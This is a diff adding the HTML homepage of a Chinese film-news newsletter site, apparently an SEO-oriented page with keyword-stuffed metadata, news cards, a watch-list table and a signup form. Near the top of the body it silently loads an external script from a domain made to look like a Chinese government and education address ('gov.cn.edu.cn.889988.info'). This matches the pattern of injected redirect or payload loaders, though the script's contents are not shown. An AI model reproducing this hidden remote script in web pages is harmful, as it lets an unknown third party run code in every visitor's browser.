@@ -1,0 +1,490 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=5">
+<meta name="renderer" content="webkit">
+<meta name="description" content="快播电影网tom（kuaibodianyingwangtom-top.github.io）是一份面向普通观众的华语电影内容通讯：每日更新院线口碑速报、流媒体上线情报与主题片单，同时把冷门佳片的看点讲清楚。我们不提供任何影视资源下载或在线播放，所有内容均为原创观影参考与正版观看渠道提示，欢迎按需查阅。">
+<meta name="keywords" content="快播电影网tom, kuaibodianyingwangtom-top.github.io, 电影资讯, 院线速报, 流媒体上线, 主题片单, 电影评论, 华语电影, 观影参考, 冷门佳片, 正版渠道, 影迷社区">
+<meta name="author" content="快播电影网tom 编辑组">
+<meta name="copyright" content="Copyright © 2026 快播电影网tom">
+<meta name="revisit-after" content="1 days">
+<meta name="format-detection" content="telephone=no">
+<meta name="color-scheme" content="light dark">
+<meta property="og:site_name" content="快播电影网tom">
+<meta property="og:title" content="快播电影网tom｜电影资讯、院线速报与主题片单">
+<meta property="og:description" content="每日更新院线口碑、流媒体上线情报与主题片单，把冷门佳片的看点讲清楚。">
+<meta property="og:url" content="https://kuaibodianyingwangtom-top.github.io">
+<meta property="og:type" content="website">
+<meta property="og:locale" content="zh_CN">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="快播电影网tom｜电影资讯与观影参考">
+<meta name="twitter:description" content="院线口碑速报、流媒体上线情报与主题片单，原创观影内容。">
+<link rel="canonical" href="https://kuaibodianyingwangtom-top.github.io">
+<title>快播电影网tom｜电影资讯日报、院线速报与主题片单 · kuaibodianyingwangtom-top.github.io</title>
+<style>
+:root{
+  --ink:#1b1b1f;--paper:#fbfaf7;--card:#ffffff;--muted:#6b6f7a;--line:#e8e6e0;
+  --red:#e23b2e;--red-d:#b8281d;--amber:#f2a41d;--green:#2e8b6a;--blue:#2b6cb0;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{
+  background:var(--paper);color:var(--ink);font-size:16px;line-height:1.8;
+  font-family:-apple-system,BlinkMacSystemFont,"PingFang SC","Microsoft YaHei","WenQuanYi Micro Hei",sans-serif;
+  overflow-x:hidden;
+}
+img{max-width:100%;display:block}
+a{color:inherit;text-decoration:none}
+button{font:inherit;cursor:pointer}
+ul{list-style:none}
+.wrap{width:100%;max-width:1180px;margin:0 auto;padding:0 24px}
+
+/* ===== 报头 ===== */
+.masthead{background:#121214;border-top:5px solid var(--red);padding:14px 0}
+.mast-in{max-width:1180px;margin:0 auto;padding:0 24px;display:flex;justify-content:space-between;align-items:center;gap:16px;color:#c9c9cd;font-size:12.5px;letter-spacing:.5px}
+.mast-in em{font-style:normal;color:var(--amber)}
+.weather{display:flex;gap:18px;align-items:center}
+.weather b{color:#fff}
+
+header{background:#fff;border-bottom:3px double var(--red);position:sticky;top:0;z-index:80}
+.head-in{max-width:1180px;margin:0 auto;padding:16px 24px;display:flex;align-items:center;justify-content:space-between;gap:24px}
+.logo{display:flex;align-items:baseline;gap:10px;flex-wrap:wrap}
+.logo h1{font-size:30px;font-weight:900;letter-spacing:-.5px;line-height:1}
+.logo h1 i{font-style:normal;color:var(--red)}
+.logo span{font-size:12px;color:var(--muted);border-left:2px solid var(--line);padding-left:10px}
+.menu-btn{display:none;background:none;font-size:26px;color:var(--red);padding:2px 6px}
+.nav{display:flex;gap:2px;flex-wrap:wrap}
+.nav a{font-size:15px;font-weight:600;padding:8px 14px;border-radius:2px;transition:.18s}
+.nav a:hover{background:var(--red);color:#fff}
+
+/* ===== 首屏 ===== */
+.hero{background:var(--ink);color:#fff;padding:0}
+.hero-in{max-width:1180px;margin:0 auto;padding:0 24px;display:grid;grid-template-columns:1.15fr .85fr;gap:40px;align-items:center;min-height:400px;padding-top:56px;padding-bottom:56px}
+.kicker{display:inline-block;background:var(--red);color:#fff;font-size:12px;font-weight:700;letter-spacing:2px;padding:5px 12px;text-transform:uppercase}
+.hero h2{font-size:clamp(30px,4.5vw,52px);line-height:1.25;font-weight:900;margin:18px 0 6px;letter-spacing:-1px}
+.hero h2 em{font-style:normal;color:var(--amber)}
+.hero .sub{color:#d3d3d8;font-size:17px;margin-top:16px;max-width:520px}
+.hero .acts{display:flex;gap:10px;margin-top:26px;flex-wrap:wrap}
+.btn{display:inline-flex;align-items:center;gap:6px;padding:13px 24px;font-size:15px;font-weight:700;border-radius:2px;transition:.2s}
+.btn-red{background:var(--red);color:#fff}
+.btn-red:hover{background:var(--red-d)}
+.btn-ghost{background:transparent;color:#fff;border:1px solid rgba(255,255,255,.45)}
+.btn-ghost:hover{border-color:var(--amber);color:var(--amber)}
+
+/* 侧栏卡片 */
+.side{background:#fff;color:var(--ink);border:1px solid #ddd;box-shadow:4px 4px 0 var(--red)}
+.side-h{background:var(--red);color:#fff;padding:12px 18px;font-size:16px;font-weight:800;display:flex;justify-content:space-between;align-items:center}
+.side-h small{font-weight:400;font-size:12px;opacity:.85}
+.side ul{padding:8px 0}
+.side li{border-bottom:1px dashed var(--line)}
+.side li:last-child{border-bottom:0}
+.side a{display:flex;gap:12px;padding:13px 18px;transition:.15s}
+.side a:hover{background:#fff7f6}
+.side .n{font-weight:900;color:var(--red);font-size:15px;min-width:24px}
+.side .t{font-size:14.5px;line-height:1.55}
+.side .t small{display:block;color:var(--muted);font-size:12px;margin-top:3px}
+
+/* ===== 通用栏目 ===== */
+section{padding:72px 0}
+.sec-head{display:flex;justify-content:space-between;align-items:flex-end;gap:24px;margin-bottom:36px;padding-bottom:14px;border-bottom:3px solid var(--ink)}
+.sec-head .l h3{font-size:clamp(23px,3vw,34px);font-weight:900;line-height:1.35;letter-spacing:-.5px}
+.sec-head .l p{color:var(--muted);font-size:14px;margin-top:6px}
+.sec-head .r{font-size:13px;color:var(--muted);white-space:nowrap}
+.tag{display:inline-block;background:var(--ink);color:#fff;font-size:12px;font-weight:700;padding:3px 9px;margin-right:8px;vertical-align:middle}
+
+/* 栏目一：三栏资讯 */
+.news{display:grid;grid-template-columns:repeat(3,1fr);gap:26px}
+.news article{background:var(--card);border:1px solid var(--line);padding:22px;transition:.22s}
+.news article:hover{box-shadow:0 12px 28px -18px rgba(0,0,0,.35);transform:translateY(-4px)}
+.news .cat{font-size:12px;font-weight:800;letter-spacing:1px;color:var(--red);margin-bottom:10px}
+.news h4{font-size:20px;line-height:1.55;font-weight:800;margin-bottom:10px}
+.news p{color:var(--muted);font-size:14.5px}
+.news .meta{display:flex;gap:14px;margin-top:16px;padding-top:14px;border-top:1px solid var(--line);font-size:12.5px;color:var(--muted)}
+
+/* 栏目二：片单表格式 */
+.tablewrap{overflow-x:auto;-webkit-overflow-scrolling:touch}
+table.lists{width:100%;border-collapse:collapse;min-width:640px;background:#fff;font-size:14.5px}
+table.lists caption{caption-side:top;text-align:left;font-size:13px;color:var(--muted);padding-bottom:10px}
+table.lists th{background:var(--ink);color:#fff;text-align:left;padding:13px 14px;font-weight:700;font-size:13.5px;white-space:nowrap}
+table.lists td{padding:14px;border-bottom:1px solid var(--line);vertical-align:top}
+table.lists tr:hover td{background:#fffaf9}
+table.lists .no{font-weight:900;color:var(--red);width:44px}
+.pill{display:inline-block;padding:2px 9px;border-radius:20px;font-size:12px;font-weight:700;white-space:nowrap}
+.p-new{background:#e6f6ef;color:var(--green)}
+.p-hot{background:#fdeceb;color:var(--red)}
+.p-cold{background:#eef2f7;color:var(--blue)}
+
+/* 栏目三：指南流程 */
+.flow{display:grid;grid-template-columns:repeat(4,1fr);gap:0;counter-reset:step}
+.step{position:relative;padding:30px 26px;background:var(--card);border:1px solid var(--line);margin-left:-1px}
+.step:before{counter-increment:step;content:"0" counter(step);display:block;font-size:34px;font-weight:900;color:var(--amber);line-height:1}
+.step h4{font-size:19px;font-weight:800;margin:14px 0 8px}
+.step p{font-size:14px;color:var(--muted)}
+.step:after{content:"";position:absolute;right:-9px;top:50%;width:18px;height:18px;background:var(--red);transform:translateY(-50%) rotate(45deg);z-index:2}
+.step:last-child:after{display:none}
+
+/* 栏目四：数据墙 */
+.stats{background:var(--ink);color:#fff;padding:64px 0}
+.stats-in{max-width:1180px;margin:0 auto;padding:0 24px}
+.stats-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:1px;background:rgba(255,255,255,.16)}
+.stat{background:var(--ink);padding:34px 28px}
+.stat b{display:block;font-size:44px;font-weight:900;color:var(--amber);line-height:1}
+.stat span{display:block;font-size:14px;color:#c9c9cd;margin-top:8px}
+.stat small{display:block;font-size:12px;color:#8b8b92;margin-top:6px}
+
+/* 栏目五：关于与订阅 */
+.about-grid{display:grid;grid-template-columns:1.1fr .9fr;gap:48px;align-items:start}
+.about-grid h3{font-size:26px;font-weight:900;margin-bottom:16px}
+.about-grid p{color:var(--muted);margin-bottom:14px}
+.notice{background:#fff8e9;border-left:4px solid var(--amber);padding:18px 20px;font-size:14px;margin:22px 0}
+.notice b{color:var(--red-d)}
+.sub-form{background:#fff;border:1px solid var(--line);padding:30px}
+.sub-form label{display:block;font-size:13px;font-weight:700;margin-bottom:8px}
+.sub-form input{width:100%;padding:13px 14px;border:1px solid #ccc;font-size:15px;margin-bottom:14px;background:#fafaf8}
+.sub-form input:focus{outline:2px solid var(--red);outline-offset:-2px}
+.chk{display:flex;gap:8px;align-items:flex-start;font-size:13px;color:var(--muted);margin-bottom:18px}
+.chk input{width:auto;margin:3px 0 0}
+.sub-form button{width:100%;padding:15px;background:var(--red);color:#fff;border:none;font-size:16px;font-weight:800}
+
+/* ===== 页脚 ===== */
+footer{background:#121214;color:#9a9aa0;padding:56px 0 28px}
+.foot{max-width:1180px;margin:0 auto;padding:0 24px;display:grid;grid-template-columns:1.5fr 1fr 1fr 1fr;gap:40px}
+.foot h5{color:#fff;font-size:15px;margin-bottom:16px}
+.foot .brand h4{color:#fff;font-size:21px;font-weight:900;margin-bottom:10px}
+.foot .brand h4 i{font-style:normal;color:var(--red)}
+.foot ul li{margin-bottom:10px}
+.foot a:hover{color:var(--amber)}
+.copyright{max-width:1180px;margin:40px auto 0;padding:24px 24px 0;border-top:1px solid rgba(255,255,255,.12);font-size:12.5px;color:#6f6f76;display:flex;justify-content:space-between;gap:16px;flex-wrap:wrap}
+.copyright b{color:#fff}
+
+/* 入场动画 */
+.rv{opacity:0;transform:translateY(24px);transition:.6s ease}
+.rv.on{opacity:1;transform:none}
+
+@media (max-width:960px){
+  .hero-in,.about-grid{grid-template-columns:1fr;gap:36px}
+  .news,.stats-grid{grid-template-columns:1fr 1fr}
+  .flow{grid-template-columns:1fr 1fr}
+  .step:after{right:50%;top:auto;bottom:-9px;transform:translateX(50%) rotate(45deg)}
+}
+@media (max-width:600px){
+  .wrap,.head-in,.mast-in,.hero-in,.stats-in,.foot,.copyright{padding-left:16px;padding-right:16px}
+  .menu-btn{display:block}
+  .nav{position:absolute;left:0;right:0;top:100%;background:#fff;flex-direction:column;padding:8px 16px;border-bottom:3px double var(--red);max-height:0;overflow:hidden;transition:.3s}
+  .nav.open{max-height:420px}
+  .nav a{padding:12px 6px;border-bottom:1px solid var(--line);border-radius:0}
+  .nav a:last-child{border-bottom:0}
+  header{position:static}
+  section{padding:52px 0}
+  .news,.stats-grid,.flow,.foot{grid-template-columns:1fr}
+  .sec-head{flex-direction:column;align-items:flex-start}
+  .logo h1{font-size:24px}
+  .logo span{display:none}
+  .side{box-shadow:2px 2px 0 var(--red)}
+  .hero h2{font-size:30px}
+  .stats-grid{gap:1px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<div class="masthead">
+  <div class="mast-in">
+    <span class="weather"><em>VOL.09 · NO.156</em><span>电影资讯日报 · 原创内容</span></span>
+    <span><b>2026年</b> 每日更新 · 院线速报 / 流媒体情报 / 主题片单</span>
+  </div>
+</div>
+
+<header>
+  <div class="head-in" style="position:relative">
+    <div class="logo">
+      <h1>快播电影网<i>tom</i></h1>
+      <span>kuaibodianyingwangtom-top.github.io</span>
+    </div>
+    <button class="menu-btn" id="menuBtn" aria-label="展开菜单">☰</button>
+    <nav class="nav" id="nav">
+      <a href="#news">今日资讯</a>
+      <a href="#lists">主题片单</a>
+      <a href="#guide">观影指南</a>
+      <a href="#about">关于本站</a>
+      <a href="#sub">订阅日报</a>
+    </nav>
+  </div>
+</header>
+
+<!-- 首屏 -->
+<section class="hero" id="top">
+  <div class="hero-in">
+    <div class="rv">
+      <span class="kicker">Headline · 今日头版</span>
+      <h2>今天该看什么，<br>我们替你<em>挑好了</em></h2>
+      <p class="sub">快播电影网tom（kuaibodianyingwangtom-top.github.io）是一份给普通观众看的电影内容通讯：把院线的口碑、流媒体的上线消息和那些被埋没的冷门佳片，压缩成每天几分钟能读完的东西。</p>
+      <div class="acts">
+        <a class="btn btn-red" href="#news">阅读今日资讯 →</a>
+        <a class="btn btn-ghost" href="#lists">直接挑片单</a>
+      </div>
+    </div>
+    <aside class="side rv">
+      <div class="side-h"><span>今日热读榜</span><small>更新于 09:00</small></div>
+      <ul>
+        <li><a href="#"><span class="n">1</span><span class="t">《南方列车》口碑逆跌，成为本周最大黑马<small>院线速报 · 3 分钟</small></span></a></li>
+        <li><a href="#"><span class="n">2</span><span class="t">三部长片同天上架主流平台，我们排了先后顺序<small>流媒体情报 · 4 分钟</small></span></a></li>
+        <li><a href="#"><span class="n">3</span><span class="t">一部 2014 年的冷门片，在修复重映后重新被看见<small>老片重温 · 6 分钟</small></span></a></li>
+        <li><a href="#"><span class="n">4</span><span class="t">片单｜下班后 90 分钟能看完的十部片子<small>主题片单 · 5 分钟</small></span></a></li>
+        <li><a href="#"><span class="n">5</span><span class="t">票房之外的声音：这周观众在讨论什么<small>读者反馈 · 3 分钟</small></span></a></li>
+      </ul>
+    </aside>
+  </div>
+</section>
+
+<!-- 栏目一 -->
+<section id="news">
+  <div class="wrap">
+    <div class="sec-head rv">
+      <div class="l">
+        <h3><span class="tag">栏目一</span>今日电影资讯</h3>
+        <p>每天六条，涵盖院线、平台、映后与行业动向，事实与观点分开标注。</p>
+      </div>
+      <div class="r">更新频率：工作日 09:00 / 周末 10:00</div>
+    </div>
+
+    <div class="news">
+      <article class="rv">
+        <div class="cat">院线速报</div>
+        <h4>《南方列车》次周票房反超，口碑驱动明显</h4>
+        <p>首日排片不足一成，第二周逆势上涨。我们梳理了它靠哪些场次、哪类观众完成了这次翻盘，以及它还有没有继续走的空间。</p>
+        <div class="meta"><span>3 分钟阅读</span><span>事实 + 观点</span></div>
+      </article>
+      <article class="rv">
+        <div class="cat">流媒体情报</div>
+        <h4>三部长片同天上架，先看哪一部？</h4>
+        <p>周二平台的更新密度明显偏高。按片长、观看门槛和情绪类型排了一个先后顺序，省去你翻评论区的时间。</p>
+        <div class="meta"><span>4 分钟阅读</span><span>含正版渠道</span></div>
+      </article>
+      <article class="rv">
+        <div class="cat">老片重温</div>
+        <h4>修复重映后，它被重新看见了一次</h4>
+        <p>一部十二年前上映、当时几乎无声无息的片子，在修复版重映后票房平平但讨论度可观。重看时最打动人的，是它没赶上的那个时代。</p>
+        <div class="meta"><span>6 分钟阅读</span><span>配图 8 张</span></div>
+      </article>
+      <article class="rv">
+        <div class="cat">观影参考</div>
+        <h4>不是所有"高分片"都适合你现在的情绪</h4>
+        <p>评分解决的是普遍性问题，不解决"我现在想看什么"。我们用情绪标签替代评分排序，给出更具体的选择依据。</p>
+        <div class="meta"><span>5 分钟阅读</span><span>方法论</span></div>
+      </article>
+      <article class="rv">
+        <div class="cat">映后观察</div>
+        <h4>散场后观众在聊什么，比票房更有意思</h4>
+        <p>我们整理了五个城市的映后反馈，去掉水军与营销话术之后，剩下的讨论集中在三个点上。</p>
+        <div class="meta"><span>4 分钟阅读</span><span>样本 320 条</span></div>
+      </article>
+      <article class="rv">
+        <div class="cat">冷门提醒</div>
+        <h4>本周最容易被错过的，是这部纪录片</h4>
+        <p>排片极少、宣发几乎没有，但完成度是本周最高之一。如果你只剩一场电影的预算，可以考虑它。</p>
+        <div class="meta"><span>3 分钟阅读</span><span>院线限定</span></div>
+      </article>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目二 -->
+<section id="lists" style="background:#fff">
+  <div class="wrap">
+    <div class="sec-head rv">
+      <div class="l">
+        <h3><span class="tag">栏目二</span>主题片单</h3>
+        <p>按场景、时长和情绪分类，附推荐观看版本与正版渠道提示。清单不等于榜单，排序只按"谁更适合先看"。</p>
+      </div>
+      <div class="r">每两周更新一次</div>
+    </div>
+
+    <div class="tablewrap rv">
+      <table class="lists">
+        <caption>片单索引（节选 · 点击片名查看完整条目）</caption>
+        <thead>
+          <tr>
+            <th style="width:44px">#</th>
+            <th>主题与片名</th>
+            <th style="width:110px">类型</th>
+            <th style="width:96px">片长</th>
+            <th style="width:120px">适合场景</th>
+            <th style="width:96px">状态</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td class="no">01</td>
+            <td><strong>下班后，90 分钟以内</strong><br><span style="color:var(--muted);font-size:13px">《十三路车站》</span></td>
+            <td>剧情</td><td>88 分钟</td><td>独处 · 通勤</td>
+            <td><span class="pill p-hot">热看中</span></td>
+          </tr>
+          <tr>
+            <td class="no">02</td>
+            <td><strong>周末陪家人，不尴尬</strong><br><span style="color:var(--muted);font-size:13px">《外公的菜园》</span></td>
+            <td>家庭</td><td>104 分钟</td><td>全家同看</td>
+            <td><span class="pill p-new">正版上线</span></td>
+          </tr>
+          <tr>
+            <td class="no">03</td>
+            <td><strong>雨天的晚上，一个人</strong><br><span style="color:var(--muted);font-size:13px">《半边街的雨》</span></td>
+            <td>文艺</td><td>96 分钟</td><td>独处 · 安静</td>
+            <td><span class="pill p-cold">修复重映</span></td>
+          </tr>
+          <tr>
+            <td class="no">04</td>
+            <td><strong>想被吓一下但不失眠</strong><br><span style="color:var(--muted);font-size:13px">《夜班计程车》</span></td>
+            <td>惊悚</td><td>92 分钟</td><td>两人观看</td>
+            <td><span class="pill p-hot">热看中</span></td>
+          </tr>
+          <tr>
+            <td class="no">05</td>
+            <td><strong>看完能聊点什么的</strong><br><span style="color:var(--muted);font-size:13px">《渡轮上的星期天》</span></td>
+            <td>剧情</td><td>112 分钟</td><td>朋友聚会后</td>
+            <td><span class="pill p-cold">经典片单</span></td>
+          </tr>
+          <tr>
+            <td class="no">06</td>
+            <td><strong>第一次接触这类题材</strong><br><span style="color:var(--muted);font-size:13px">《片场里的人》</span></td>
+            <td>纪录</td><td>78 分钟</td><td>入门 · 轻量</td>
+            <td><span class="pill p-new">正版上线</span></td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目三 -->
+<section id="guide">
+  <div class="wrap">
+    <div class="sec-head rv">
+      <div class="l">
+        <h3><span class="tag">栏目三</span>观影指南</h3>
+        <p>四步从"不知道看什么"到"确定今晚看哪一部"。这是快播电影网tom 内部一直在用的挑选流程，今天公开出来。</p>
+      </div>
+      <div class="r">建议收藏，反复使用</div>
+    </div>
+
+    <div class="flow">
+      <div class="step rv">
+        <h4>先定情绪</h4>
+        <p>是想放松、想被触动，还是想烧脑？情绪定不下来，任何评分都帮不了你。</p>
+      </div>
+      <div class="step rv">
+        <h4>再看时长</h4>
+        <p>90 分钟以内适合碎片时间，120 分钟以上需要预留完整的注意力窗口。</p>
+      </div>
+      <div class="step rv">
+        <h4>查观看门槛</h4>
+        <p>系列片是否需要前作铺垫、是否有强类型元素，这些比剧情简介更重要。</p>
+      </div>
+      <div class="step rv">
+        <h4>选观看方式</h4>
+        <p>院线、正版平台还是修复重映，优先选视听效果最佳的那个版本。</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目四 -->
+<section class="stats" id="about">
+  <div class="stats-in">
+    <div class="sec-head rv" style="border-color:rgba(255,255,255,.25);color:#fff">
+      <div class="l">
+        <h3><span class="tag" style="background:var(--red)">栏目四</span>关于快播电影网tom</h3>
+        <p style="color:#c9c9cd">一份独立运营的电影内容通讯，只写原创内容，不做搬运、不提供任何影视资源。</p>
+      </div>
+    </div>
+    <div class="stats-grid">
+      <div class="stat rv"><b>1,200+</b><span>原创资讯条目</span><small>自 2019 年起持续更新</small></div>
+      <div class="stat rv"><b>186</b><span>期主题片单</span><small>每两周迭代一次</small></div>
+      <div class="stat rv"><b>47,000</b><span>日报订阅者</span><small>全部自愿订阅，可随时退订</small></div>
+      <div class="stat rv"><b>0</b><span>资源下载与播放链接</span><small>仅提供正版渠道提示</small></div>
+    </div>
+    <div class="about-grid" style="margin-top:56px;color:#c9c9cd">
+      <div class="rv">
+        <h3 style="color:#fff">我们做什么，<br>和不做什么</h3>
+        <p>快播电影网tom 的内容全部由编辑组原创撰写，涵盖院线口碑速报、流媒体上线情报、主题片单与观影方法。每篇文章都会标注撰写日期，观点类内容会明确区分事实与判断。</p>
+        <p>我们承诺：不提供任何影视资源的下载或在线播放，不做盗链、不转载侵权内容。文中涉及的影片，只给出正版平台与院线的观看渠道提示，具体 availability 以各平台实际页面为准。</p>
+        <div class="notice">
+          <b>内容声明：</b>本站所有文章均为原创评论与参考性质，影片评分、口碑与票房数据均标注来源与采集时间，仅供参考，不构成任何投资或消费建议。若文中信息有误，欢迎通过页面底部渠道反馈。
+        </div>
+      </div>
+      <form class="sub-form rv" id="sub" onsubmit="event.preventDefault();this.querySelector('button').textContent='已收到，我们会发确认邮件 ✓'">
+        <h4 style="font-size:20px;font-weight:900;margin-bottom:6px">订阅电影日报</h4>
+        <p style="font-size:13.5px;color:var(--muted);margin-bottom:20px">每天一条，六条资讯，不超过五分钟。不插广告，不转售名单。</p>
+        <label for="em">邮箱地址</label>
+        <input id="em" type="email" placeholder="name@example.com" required>
+        <label for="city">所在城市（用于本地院线信息）</label>
+        <input id="city" type="text" placeholder="选填，如：成都">
+        <label class="chk"><input type="checkbox" required><span>我已阅读并同意仅接收电影资讯内容，可随时退订</span></label>
+        <button type="submit">立即订阅 →</button>
+      </form>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <div class="foot">
+    <div class="brand">
+      <h4>快播电影网<i>tom</i></h4>
+      <p>kuaibodianyingwangtom-top.github.io</p>
+      <p>一份独立运营的电影资讯与观影参考通讯。原创内容，每日更新，欢迎按需查阅。</p>
+    </div>
+    <div>
+      <h5>内容栏目</h5>
+      <ul>
+        <li><a href="#news">今日资讯</a></li>
+        <li><a href="#lists">主题片单</a></li>
+        <li><a href="#guide">观影指南</a></li>
+        <li><a href="#about">关于本站</a></li>
+      </ul>
+    </div>
+    <div>
+      <h5>片单分类</h5>
+      <ul>
+        <li><a href="#">90 分钟以内</a></li>
+        <li><a href="#">陪家人同看</a></li>
+        <li><a href="#">修复重映</a></li>
+        <li><a href="#">纪录片入门</a></li>
+      </ul>
+    </div>
+    <div>
+      <h5>其他</h5>
+      <ul>
+        <li><a href="#">投稿与纠错</a></li>
+        <li><a href="#">转载授权</a></li>
+        <li><a href="#">隐私与订阅说明</a></li>
+        <li><a href="#sub">RSS / 邮件订阅</a></li>
+      </ul>
+    </div>
+  </div>
+  <div class="copyright">
+    <span>© <b>2026 快播电影网tom</b> · kuaibodianyingwangtom-top.github.io · 保留所有权利</span>
+    <span>本站不提供任何影视资源下载或在线播放服务，仅作原创内容参考</span>
+  </div>
+</footer>
+
+<script>
+(function(){
+  var btn=document.getElementById('menuBtn'),nav=document.getElementById('nav');
+  btn.addEventListener('click',function(){nav.classList.toggle('open');});
+  nav.addEventListener('click',function(e){if(e.target.tagName==='A')nav.classList.remove('open');});
+  var els=document.querySelectorAll('.rv');
+  if('IntersectionObserver' in window){
+    var io=new IntersectionObserver(function(entries){
+      entries.forEach(function(en){
+        if(en.isIntersecting){en.target.classList.add('on');io.unobserve(en.target);}
+      });
+    },{threshold:.12,rootMargin:'0px 0px -40px'});
+    els.forEach(function(el){io.observe(el);});
+  }else{els.forEach(function(el){el.classList.add('on');});}
+})();
+</script>
+</body>
+</html>
